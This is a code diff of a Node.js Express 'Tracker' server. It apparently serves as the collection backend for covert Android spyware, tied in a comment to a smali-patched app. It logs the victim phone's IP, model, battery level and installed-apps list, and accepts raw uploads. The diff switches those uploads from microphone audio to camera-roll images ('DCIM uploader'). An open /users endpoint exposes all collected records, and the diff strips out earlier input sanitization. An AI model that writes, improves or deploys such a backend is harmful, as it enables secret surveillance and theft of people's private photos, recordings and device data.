@@ -6,36 +6,21 @@ const multer = require('multer');
 const app = express();
 app.use(express.json());
 
-const LOG_FILE = "logs.json";
-const MAX_LINES = 1000;
+/* ================= CONFIG ================= */
 
-/* ================= STORAGE ================= */
+const LOG_FILE = "logs.json";
+const UPLOAD_DIR = path.join(__dirname, "uploads");
+
+if (!fs.existsSync(UPLOAD_DIR)) {
+  fs.mkdirSync(UPLOAD_DIR);
+}
 
 const upload = multer({
-  dest: 'uploads/',
-  limits: { fileSize: 10 * 1024 * 1024 }
+  dest: UPLOAD_DIR,
+  limits: { fileSize: 10 * 1024 * 1024 } // 10MB
 });
 
-app.use('/uploads', express.static(path.join(__dirname, 'uploads')));
-
-/* ================= SAVE LOG ================= */
-
-function saveLog(data) {
-  try {
-    fs.appendFileSync(LOG_FILE, JSON.stringify(data) + "\n");
-
-    const lines = fs.readFileSync(LOG_FILE, "utf-8")
-      .split("\n")
-      .filter(l => l.trim() !== '');
-
-    if (lines.length > MAX_LINES) {
-      fs.writeFileSync(LOG_FILE, lines.slice(-MAX_LINES).join("\n") + "\n");
-    }
-
-  } catch (e) {
-    console.log("File error:", e.message);
-  }
-}
+app.use('/uploads', express.static(UPLOAD_DIR));
 
 /* ================= HELPERS ================= */
 
@@ -45,36 +30,25 @@ function getIP(req) {
       || "unknown";
 }
 
-function safeString(val, max = 100) {
-  if (!val) return "unknown";
-  return String(val).substring(0, max);
-}
-
-function parseApps(input) {
-  if (!input) return [];
-
+function saveLog(data) {
   try {
-    return decodeURIComponent(input)
-      .split(',')
-      .map(x => x.trim())
-      .filter(Boolean)
-      .slice(0, 100);
-  } catch {
-    return [];
+    fs.appendFileSync(LOG_FILE, JSON.stringify(data) + "\n");
+  } catch (e) {
+    console.log("Log error:", e.message);
   }
 }
 
 /* ================= TRACK ================= */
 
 app.get('/track', (req, res) => {
+
   const data = {
     ip: getIP(req),
-    userAgent: req.headers['user-agent'] || "unknown",
-    model: safeString(req.query.model),
-    brand: safeString(req.query.brand),
-    android: safeString(req.query.android),
+    model: req.query.model || "unknown",
+    brand: req.query.brand || "unknown",
+    android: req.query.android || "unknown",
     battery: Number(req.query.battery) || null,
-    apps: parseApps(req.query.apps),
+    apps: req.query.apps || "",
     time: new Date().toISOString()
   };
 
@@ -86,17 +60,23 @@ app.get('/track', (req, res) => {
   res.json({ status: "ok" });
 });
 
-/* ================= AUDIO UPLOAD (HYBRID) ================= */
+/* ================= UPLOAD ================= */
 
-app.post('/upload-audio', (req, res, next) => {
-  // detect multipart
-  if (req.headers['content-type']?.includes('multipart')) {
-    return upload.single('audio')(req, res, () => {
-      if (!req.file) return res.status(400).send("No file");
+app.post('/upload-audio', (req, res) => {
+
+  const contentType = req.headers['content-type'] || "";
+
+  // 🔴 MULTIPART SUPPORT
+  if (contentType.includes("multipart")) {
+    upload.single('audio')(req, res, () => {
+
+      if (!req.file) {
+        return res.status(400).send("No file");
+      }
 
       const url = `${req.protocol}://${req.get('host')}/uploads/${req.file.filename}`;
 
-      console.log("🎤 MULTIPART AUDIO:", req.file.filename);
+      console.log("📦 MULTIPART:", req.file.filename);
 
       saveLog({
         type: "multipart",
@@ -106,21 +86,31 @@ app.post('/upload-audio', (req, res, next) => {
         time: new Date().toISOString()
       });
 
-      res.json({ status: "uploaded", url });
+      return res.json({ status: "uploaded", url });
     });
+
+    return;
   }
 
-  // RAW upload (your smali case)
-  const fileName = Date.now() + ".mp3";
-  const filePath = path.join(__dirname, "uploads", fileName);
+  // 🔥 RAW UPLOAD (SMALI)
+  let ext = ".jpg";
+
+  if (contentType.includes("png")) ext = ".png";
+  if (contentType.includes("jpeg")) ext = ".jpg";
+
+  const fileName = Date.now() + ext;
+  const filePath = path.join(UPLOAD_DIR, fileName);
 
   const stream = fs.createWriteStream(filePath);
+
   req.pipe(stream);
 
   req.on('end', () => {
+
     const url = `${req.protocol}://${req.get('host')}/uploads/${fileName}`;
 
-    console.log("🎤 RAW AUDIO:", fileName);
+    console.log("📸 RAW IMAGE:", fileName);
+    console.log("IP:", getIP(req));
 
     saveLog({
       type: "raw",
@@ -131,12 +121,17 @@ app.post('/upload-audio', (req, res, next) => {
 
     res.json({ status: "uploaded", url });
   });
+
+  req.on('error', (err) => {
+    console.log("Upload error:", err.message);
+    res.status(500).send("error");
+  });
 });
 
-/* ================= AUDIO STREAM ================= */
+/* ================= FILE VIEW ================= */
 
 app.get('/audio/:name', (req, res) => {
-  const filePath = path.join(__dirname, 'uploads', req.params.name);
+  const filePath = path.join(UPLOAD_DIR, req.params.name);
 
   if (!fs.existsSync(filePath)) {
     return res.status(404).send("File not found");
@@ -151,17 +146,20 @@ app.get('/users', (req, res) => {
   try {
     if (!fs.existsSync(LOG_FILE)) return res.json([]);
 
-    const list = fs.readFileSync(LOG_FILE, "utf-8")
+    const data = fs.readFileSync(LOG_FILE, "utf-8");
+
+    const list = data
       .split("\n")
       .filter(Boolean)
       .map(x => {
-        try { return JSON.parse(x); } catch { return null; }
+        try { return JSON.parse(x); }
+        catch { return null; }
       })
       .filter(Boolean);
 
     res.json(list);
 
-  } catch {
+  } catch (e) {
     res.json([]);
   }
 });
@@ -182,7 +180,7 @@ app.get('/health', (req, res) => {
 /* ================= HOME ================= */
 
 app.get('/', (req, res) => {
-  res.send("Tracker running (hybrid upload ready)");
+  res.send("Tracker running (DCIM uploader ready)");
 });
 
 /* ================= START ================= */
